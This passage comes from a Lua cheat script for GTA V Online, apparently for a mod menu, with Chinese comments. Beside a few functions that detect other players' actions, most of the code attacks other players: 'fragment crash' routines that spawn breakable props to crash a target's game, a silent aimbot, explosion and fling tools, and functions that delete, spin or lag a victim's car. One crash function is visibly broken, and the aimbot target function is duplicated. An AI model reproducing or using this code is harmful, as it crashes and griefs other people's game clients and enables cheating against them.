            if not util.is_session_transition_active() and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior
            and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(pid)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 20.0 then
                    util.toast(players.get_name(pid) .. " 正在观看你")
                    break
                end
            end
        end
    end
end
--传送检测
function tp_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local oldpos = players.get_position(pid)
            util.yield(1000)
            local currentpos = players.get_position(pid)
            for i, interior in ipairs(interior_stuff) do
                if v3.distance(oldpos, currentpos) > 500 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
                and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior and PLAYER.IS_PLAYER_PLAYING(pid) and players.exists(pid) then
                    util.toast(players.get_name(pid) .. " 刚刚进行了传送")
                end
            end
        end
    end
end

function roundDecimals(float, decimals)
    decimals = 10 ^ decimals
    return math.floor(float * decimals) / decimals
end


markedPlayers = {}
otrBlipColour = 58
chatSpamSettings = {
    enabled = false,
    ignoreTeam = true,
    identicalMessages = 5,
}
--天基炮检测
function orbdection()
    local playerList = players.list(false, true, true)
    for i = 1, #playerList do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerList[i])
        if TASK.GET_IS_TASK_ACTIVE(ped, 135) and ENTITY.GET_ENTITY_SPEED(ped) == 0 then
            local pos = NETWORK._NETWORK_GET_PLAYER_COORDS(playerList[i])
            for j = 1, #orbitalTableCords do
                if roundDecimals(pos.x, 1) == roundDecimals(orbitalTableCords[j].x, 1) and roundDecimals(pos.y, 1) == roundDecimals(orbitalTableCords[j].y, 1) and roundDecimals(pos.z, 1) == roundDecimals(orbitalTableCords[j].z, 1) then
                    util.toast(players.get_name(playerList[i]) ..' '.. '正在使用天基炮')
                end
            end
        end
    end
end
--碎片崩溃V1
function fragcrash_v1(PlayerID)
    BlockSyncs(PlayerID, function()
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        util.yield(1000)
        entities.delete_by_handle(object)
    end)
end
--碎片崩溃V2
function fragcrash_v2(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    for i = 0, 100 do 
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    util.yield(10)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    return
end
end
function initial_d_score_thread()
    util.create_thread(function()
        local drift_score = 0
        local is_drifting = false
        while true do
            if not initial_d_mode or not initial_d_score then 
                util.stop_thread()
            end
            if player_cur_car ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then 
                if math.abs(ENTITY.GET_ENTITY_SPEED_VECTOR(player_cur_car, true).x) > 2 then 
                    is_drifting = true
                    drift_score = drift_score + 1
                    local c = ENTITY.GET_ENTITY_COORDS(player_cur_car)
                    c.z = c.z + 0.3
                    local score_pos = world_to_screen_coords(c.x, c.y, c.z)
                    directx.draw_text(score_pos.x, score_pos.y, "漂移分数: " .. tostring(drift_score), 5, 1, {r=1, g= 0.5, b = 0.4, a = 100}, true)
                else
                    if is_drifting then
                        is_drifting = false
                        notify("总漂移得分: " .. drift_score)
                    end
                    drift_score = 0
                end
            end
            util.yield()
        end
    end)
end
--相机方向推力
thrust_cam_dir_add = 1.25
before_vel = {x = 1, y = 1, z = 1}
function cam_direction()
local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
-- credits to jinxscript
local inst = v3.new()
v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
local tmp = v3.toDir(inst)
v3.set(inst, v3.get(tmp))
v3.mul(inst, 10)
v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
v3.add(inst, tmp)
local aim_pos = inst
local car_pos = ENTITY.GET_ENTITY_COORDS(player_cur_car)
local c = {}
c.x = before_vel.x+thrust_cam_dir_add + (aim_pos.x - car_pos.x)
c.y = before_vel.y+thrust_cam_dir_add + (aim_pos.y - car_pos.y)
ENTITY.SET_ENTITY_VELOCITY(player_cur_car, c.x, c.y, -0.002)
end
--俄罗斯转盘
randomizer = function(x)
    local r = math.random(1,3)
    return x[r]
end

array = {"1","1","2"}

function pid_to_handle(pid)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, memory.alloc(13*8), 13)
    return memory.alloc(13*8)
end

saimbot_mode = "closest"
function get_aimbot_target()
    local dist = 1000000000
    local cur_tar = 0
    for k,v in pairs(entities.get_all_peds_as_handles()) do
        local target_this = true
        local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        local ped_pos = ENTITY.GET_ENTITY_COORDS(v, true)
        local this_dist = MISC.GET_DISTANCE_BETWEEN_COORDS(player_pos['x'], player_pos['y'], player_pos['z'], ped_pos['x'], ped_pos['y'], ped_pos['z'], true)
        if PLAYER.PLAYER_PED_ID() ~= v and not ENTITY.IS_ENTITY_DEAD(v) then
            if not satarget_players then
                if PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not satarget_npcs then
                if not PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(PLAYER.PLAYER_PED_ID(), v, 17) then
                target_this = false
            end
            if satarget_usefov then
                if not PED.IS_PED_FACING_PED(PLAYER.PLAYER_PED_ID(), v, sa_fov) then
                    target_this = false
                end
            end
            if satarget_novehicles then
                if PED.IS_PED_IN_ANY_VEHICLE(v, true) then
                    target_this = false
                end
            end
            if satarget_nogodmode then
                if not ENTITY._GET_ENTITY_CAN_BE_DAMAGED(v) then
                    target_this = false
                end
            end
            if not satarget_targetfriends and satarget_players then
                if PED.IS_PED_A_PLAYER(v) then
                    local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(v)
                    local hdl = pid_to_handle(pid)
                    if NETWORK.NETWORK_IS_FRIEND(hdl) then
                        target_this = false
                    end
                end
            end
            if saimbot_mode == "closest" then
                if this_dist <= dist then
                    if target_this then
                        dist = this_dist
                        cur_tar = v
                    end
                end
            end
        end
    end
    return cur_tar
end
function start_silent_aimbot()
    saimbot_thread = util.create_thread(function (thr)
    while true do
        if not silent_aimbot then
            util.stop_thread()
        end
        local target = get_aimbot_target()
        if target ~= 0 then
            local t_pos = PED.GET_PED_BONE_COORDS(target, 31086, 0.01, 0, 0)
            local t_pos2 = PED.GET_PED_BONE_COORDS(target, 31086, -0.01, 0, 0.00)
            -- debug shit, ignore
            if false then
                GRAPHICS.DRAW_MARKER(0, t_pos['x'], t_pos['y'], t_pos['z'], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
                GRAPHICS.DRAW_MARKER(0, t_pos2['x'], t_pos2['y'], t_pos2['z'], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
            end
            GRAPHICS.DRAW_MARKER(0, t_pos['x'], t_pos['y'], t_pos['z']+2, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, 1, 1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
            if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                local wep = WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID())
                local dmg = WEAPON.GET_WEAPON_DAMAGE(wep, 0)
                if satarget_damageo then
                    dmg = sa_odmg
                end
                local veh = PED.GET_VEHICLE_PED_IS_IN(target, false)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(t_pos['x'], t_pos['y'], t_pos['z'], t_pos2['x'], t_pos2['y'], t_pos2['z'], dmg, true, wep, PLAYER.PLAYER_PED_ID(), true, false, 10000, veh)
            end
        end
        util.yield()
    end
end)
end

VEH_MISSILE_SPEED = 10000

MISL_AIM = false
missile_settings = {
    radius = 300,
    speed = 100,
    los = true,
    cam = false,
    ptfx = true,
    ptfx_scale = 1,
    air_target = false,
    multitarget = false,
    multiped = false
}
missile_particles = {
    name = "exp_grd_rpg_lod",
    dictionary = "core"
}

--Later: block rockets (spawn walls when detecting they are in range)

ATTACH_CAM_TO_ENTITY_WITH_FIXED_DIRECTION = function (--[[Cam (int)]] cam, --[[Entity (int)]] entity, --[[float]] xRot, --[[float]] yRot, --[[float]] zRot, --[[float]] xOffset, --[[float]] yOffset, --[[float]] zOffset, --[[BOOL (bool)]] isRelative)
    native_invoker.begin_call()
    native_invoker.push_arg_int(cam)
    native_invoker.push_arg_int(entity)
    native_invoker.push_arg_float(xRot); native_invoker.push_arg_float(yRot); native_invoker.push_arg_float(zRot)
    native_invoker.push_arg_float(xOffset); native_invoker.push_arg_float(yOffset); native_invoker.push_arg_float(zOffset)
    native_invoker.push_arg_bool(isRelative)
    native_invoker.end_call("202A5ED9CE01D6E7")
end

--https://github.com/Sainan/gta-v-joaat-hash-db/blob/senpai/out/objects-hex.csv

Rocket_Hashes = {
    {"rpg", util.joaat("w_lr_rpg_rocket")},
    {"homingrpg", util.joaat("w_lr_homing_rocket")},
    {"oppressor2", util.joaat("w_ex_vehiclemissile_3")},
    {"b11barrage", util.joaat("w_smug_airmissile_01b")},
    {"b11regular", util.joaat("w_battle_airmissile_01")},
    {"chernobog", util.joaat("w_ex_vehiclemissile_4")},
    {"akula", util.joaat("w_smug_airmissile_02")},
    {"grenadelauncher", util.joaat("w_lr_40mm")}, --grenade launcher lmfao
    {"compactemplauncher", util.joaat("w_lr_ml_40mm")}, --compact emp launhcer lmao
    {"teargas", util.joaat("w_ex_grenadesmoke")} --tear gas grenade lmfao
}

Chosen_Rocket_Hash = Rocket_Hashes[1][2] --default is the regular RPG
MISSILE_ENTITY_TABLE = {}

MISL_AIR = false

ORB_Sneaky = false

sa_fov = 180

sa_odmg = 100

CAR_S_sneaky = false
CAR_S_BLACKLIST = {}


LegitRapidFire = false
LegitRapidMS = 100

AIM_WHITELIST = {}

Silent_Aimbot = {
    hitboxes = {
        head = {hash = 12844, toggled = false},
        spine = {hash = 24817, toggled = false},
        pelvis = {hash = 11816, toggled = false},
    },

    fov = 2,
    dist = 300,
    dmg = 100,

    los_check = true,
    fov_check = true,

    hash = 177293209, --heavy sniper mk2 hash
    advanced = {
        speed = -1
    }
}
function GetSuitableAimbotTarget(fov, fovcheck, dist, loscheck)
    local ourped = GetLocalPed()
    local distsq = dist * dist
    local ourc = ENTITY.GET_ENTITY_COORDS(ourped)
    local entTable = entities.get_all_peds_as_pointers()
    local inRange = {}
    for _, entity in pairs(entTable) do

        local entpos = entities.get_position(entity)

            if PVP_SYSTEM.VDIST2(ourc.x, ourc.y, ourc.z, entpos.x, entpos.y, entpos.z) <= distsq then --distance check

                local handle = entities.pointer_to_handle(entity)
                if (handle ~= ourped) then
                    if (not PED.IS_PED_DEAD_OR_DYING(handle)) and (INTERIOR.GET_INTERIOR_FROM_ENTITY(handle) == 0) then --dead/interior check

                        if (fovcheck and PED.IS_PED_FACING_PED(ourped, handle, fov)) or (not fovcheck) then --fov check

                            if (PED.IS_PED_A_PLAYER(handle)) and (not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)]) then --whitelist, player check

                                if (loscheck and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ourped, handle, 17)) or (not loscheck) then --line-of-sight check
                                    inRange[#inRange+1] = handle
                                end
                            end
                        end
                    end
                end
            end

    end
    local retplayer
    local d = 99999999999
    if #inRange ~= 0 then
        for _, ped in pairs(inRange) do
            local tc = ENTITY.GET_ENTITY_COORDS(ped)
            local vidsti = PVP_SYSTEM.VDIST2(ourc.x, ourc.y, ourc.z, tc.x, tc.y, tc.z)
            if vidsti < d then
                retplayer = ped
                d = vidsti
            end
        end
        return retplayer
    end
    return nil
end
--上帝之指
local is_player_pointing = function ()
	return read_global.int(4521801 + 930) == 3
end

local targetEntity = NULL
local lastStop <const> = newTimer()
local explosionProof = false
function godfinger()
    if is_player_pointing() then
		write_global.int(4521801 + 935, NETWORK.GET_NETWORK_TIME())
		if not ENTITY.DOES_ENTITY_EXIST(targetEntity) then
			local flag = TraceFlag.peds | TraceFlag.vehicles | TraceFlag.pedsSimpleCollision | TraceFlag.objects
			local raycastResult = get_raycast_result(500.0, flag)

			if raycastResult.didHit and ENTITY.DOES_ENTITY_EXIST(raycastResult.hitEntity) then
				targetEntity = raycastResult.hitEntity
			end
		else
			local myPos = players.get_position(players.user())
			local entityPos = ENTITY.GET_ENTITY_COORDS(targetEntity, true)
			local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
			local distance = myPos:distance(entityPos)
			if distance > 30.0 then distance = 30.0
			elseif distance < 10.0 then distance = 10.0 end
			local targetPos = v3.new(camDir)
			targetPos:mul(distance)
			targetPos:add(myPos)
			local direction = v3.new(targetPos)
			direction:sub(entityPos)
			direction:normalise()

			if ENTITY.IS_ENTITY_A_PED(targetEntity) then
				direction:mul(5.0)
				local explosionPos = v3.new(entityPos)
				explosionPos:sub(direction)
				draw_bounding_box(targetEntity, false, {r = 255, g = 255, b = 255, a = 255})
				set_explosion_proof(players.user_ped(), true)
				explosionProof = true
				FIRE.ADD_EXPLOSION(explosionPos.x, explosionPos.y, explosionPos.z, 29, 25.0, false, true, 0.0, true)
			else
				local vel = v3.new(direction)
				local magnitude = entityPos:distance(targetPos)
				vel:mul(magnitude)
				draw_bounding_box(targetEntity, true, {r = 255, g = 255, b = 255, a = 80})
				request_control_once(targetEntity)
				ENTITY.SET_ENTITY_VELOCITY(targetEntity, vel.x, vel.y, vel.z)
			end
		end
	elseif targetEntity ~= NULL then
		lastStop.reset()
		targetEntity = NULL

	elseif explosionProof and lastStop.elapsed() > 500 then
		explosionProof = false
		set_explosion_proof(players.user_ped(), false)
    end
end
local function tpTableToPlayer(tbl, pid)
    if NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        for _, v in pairs(tbl) do
            if (not PED.IS_PED_A_PLAYER(v)) then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(v, c.x, c.y, c.z, false, false, false)
            end
        end
    end
end
function TpAllPeds(player)
    local pedHandles = entities.get_all_peds_as_handles()
    tpTableToPlayer(pedHandles, player)
end
function TpAllVehs(player)
    local vehHandles = entities.get_all_vehicles_as_handles()
    tpTableToPlayer(vehHandles, player)
end
function TpAllObjects(player)
    local objHandles = entities.get_all_objects_as_handles()
    tpTableToPlayer(objHandles, player)
end
function stcnm(pid)
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "SPAWN", PLAYER.GET_PLAYER_PED(pid), "BARRY_01_SOUNDSET", true, 2)
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "External_Explosion", PLAYER.GET_PLAYER_PED(pid), "Methamphetamine_Job_Sounds", true, 1)
end

function phonesoundcnm(pid)
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Menu_Accept", PLAYER.GET_PLAYER_PED(pid), "Phone_SoundSet_Default", true, 2)
end
function letcarlagging(pid)
    local ped = PLAYER.GET_PLAYER_PED(pid)
   if PED.IS_PED_IN_ANY_VEHICLE(ped) then
       local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
       local velocity = ENTITY.GET_ENTITY_VELOCITY(veh)
       local oldcoords = ENTITY.GET_ENTITY_COORDS(ped)
       wait(500)
       local nowcoords = ENTITY.GET_ENTITY_COORDS(ped)
       for a = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
       wait(200)
       for b = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
       for c = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, nowcoords.x, nowcoords.y, nowcoords.z, false, false, false)
       for d = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
       wait(500)
   else
       local notification = b_notifications.new()
       notification.notify("通知","八嘎，他都不在车内你让我怎么玩！")
   end
end
--摇头丸
function request_control_of_entity_once(ent)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and util.is_session_started() then
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
    end
end
function carspin(pid)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        request_control_of_entity_once(car)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(car, 4, 0.0, 0.0, 300.0, 0, true, true, false, true, true, true)
    end
end
saimbot_mode = "closest"
function get_aimbot_target()
    local dist = 1000000000
    local cur_tar = 0
    for k,v in pairs(entities.get_all_peds_as_handles()) do
        local target_this = true
        local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        local ped_pos = ENTITY.GET_ENTITY_COORDS(v, true)
        local this_dist = MISC.GET_DISTANCE_BETWEEN_COORDS(player_pos['x'], player_pos['y'], player_pos['z'], ped_pos['x'], ped_pos['y'], ped_pos['z'], true)
        if PLAYER.PLAYER_PED_ID() ~= v and not ENTITY.IS_ENTITY_DEAD(v) then
            if not satarget_players then
                if PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not satarget_npcs then
                if not PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(PLAYER.PLAYER_PED_ID(), v, 17) then
                target_this = false
            end
            if satarget_usefov then
                if not PED.IS_PED_FACING_PED(PLAYER.PLAYER_PED_ID(), v, sa_fov) then
                    target_this = false
                end
            end
            if satarget_novehicles then
                if PED.IS_PED_IN_ANY_VEHICLE(v, true) then
                    target_this = false
                end
            end
            if satarget_nogodmode then
                if not ENTITY._GET_ENTITY_CAN_BE_DAMAGED(v) then
                    target_this = false
                end
            end
            if not satarget_targetfriends and satarget_players then
                if PED.IS_PED_A_PLAYER(v) then
                    local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(v)
                    local hdl = pid_to_handle(pid)
                    if NETWORK.NETWORK_IS_FRIEND(hdl) then
                        target_this = false
                    end
                end
            end
            if saimbot_mode == "closest" then
                if this_dist <= dist then
                    if target_this then
                        dist = this_dist
                        cur_tar = v
                    end
                end
            end
        end
    end
    return cur_tar
end
--息怒崩
function jesus_help_me()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
    local SelfPlayerPed = entities.create_ped(2, util.joaat("u_m_m_jesus_01"), SelfPlayerPos, 0)
    for i = 1, 20 do                   
        ENTITY.SET_ENTITY_INVINCIBLE(SelfPlayerPed, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
        PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(200)
        WIRI_VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, util.joaat("prop_beach_parasol_05"))
        WIRI_VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
        entities.delete_by_handle(SelfPlayerPed)
    end
end
function changemodel(pid)
give_car_addon(pid, util.joaat("h4_prop_h4_loch_monster"), true, -90.0)
end


zaijumoxing = {"prop_sam_01"}
function jibamodel(pid)
give_car_addon(pid, util.joaat("prop_sam_01"), true, -90.0)
give_car_addon(pid, util.joaat("prop_sam_01"), true, -45.0)
give_car_addon(pid, util.joaat("prop_sam_01"), true, 45.0)
give_car_addon(pid, util.joaat("prop_sam_01"), true, 90.0)
give_car_addon(pid, util.joaat("prop_sam_01"), true, 0.0)
end
obj_pp = {"prop_cs_dildo_01", "prop_ld_bomb_01", "prop_sam_01"}
opt_pp = {"小鸡巴", "大鸡巴", "超级鸡巴", "删除"}

function getbigjb(index, value, click_type)
    pluto_switch index do
        case 1:
            attach_to_player("prop_cs_dildo_01", 57597, -0.1, 0.15, 0, 0, 90, 90)
            break
        case 2:
            attach_to_player("prop_ld_bomb_01", 57597, -0.1, 0.6, 0, 0, 180, 180)
            break
        case 3:
            attach_to_player("prop_sam_01", 57597, -0.1, 1.7, 0, 0, 180, 180)
            break
        case 4:
            for k, model in pairs(obj_pp) do 
                delete_object(model)
            end
            break
        end
    end
function deleplayercar(pid)
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(player)
    if not PED.IS_PED_IN_ANY_VEHICLE(player, true) then
        util.toast("玩家不在载具里. :/")
        return
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_veh)
    util.yield(500)
    if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(player_veh) then
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(player_veh, false, false)
        entities.delete_by_handle(player_veh)
    else
        util.toast("无法控制此玩家载具. :/")
    end
end

local function fastNet(entity, playerID)
    local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
        for i = 1, 30 do
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
                wait(10)
            else
                goto continue
            end    
        end
    end
    ::continue::
    if SE_Notifications then
        util.toast("有控制权.")
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
    wait(10)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, playerID, true)
    wait(10)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, true, false)
    wait(10)
    ENTITY._SET_ENTITY_CLEANUP_BY_ENGINE(entity, false)
    wait(10)
    if ENTITY.IS_ENTITY_AN_OBJECT(entity) then
        NETWORK.OBJ_TO_NET(entity)
    end
    wait(10)
    if BA_visible then
        ENTITY.SET_ENTITY_VISIBLE(entity, true, 0)
    else
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
    end
end
function qfmq(pid)
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local forwardOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 4, 0)
    local pheading = ENTITY.GET_ENTITY_HEADING(ped)
    local hash = 309416120
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do wait() end
    local a1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z - 1, true, true, true)
    ENTITY.SET_ENTITY_HEADING(a1, pheading + 90)
    fastNet(a1, pid)
    local b1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z + 1, true, true, true)
    ENTITY.SET_ENTITY_HEADING(b1, pheading + 90)
    fastNet(b1, pid)
    wait(1000)
    entities.delete_by_handle(a1)
    entities.delete_by_handle(b1)
end
speed = 6
function do_vehicle_fly() 
